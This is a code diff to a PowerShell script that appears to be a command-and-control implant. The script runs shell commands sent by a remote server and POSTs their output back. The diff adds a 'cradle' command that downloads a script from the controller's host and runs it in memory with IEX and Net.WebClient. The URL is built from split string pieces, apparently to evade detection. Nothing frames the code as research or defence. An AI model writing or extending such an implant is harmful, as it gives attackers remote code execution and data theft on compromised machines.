@@ -53,13 +53,18 @@ for (;;){
         if ($command -eq "shell") {
             $f    = "powershell.exe"
             $arg  = "/c "
-                    
+
             foreach ($a in $args){ $arg += $a + " " }
 
             $res  = shell $f $arg
             $data = @{result = "$res"}
                         
             Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
+        } elseif ($command -eq "cradle") {
+            $script_id = $task[1]
+            $cradlel = "http" + ':' + "//$ip" + ':' + "$port/dl/$script_id"
+            $cradle = "IEX(New-Object Net.WebClient).DownloadString(`"" + $cradlel + "`");"
+            Invoke-Expression $cradle
         } elseif ($command -eq "rename") {
             $url = ("http" + ':' + "//$ip" + ':' + "$port/rename/$name")
 
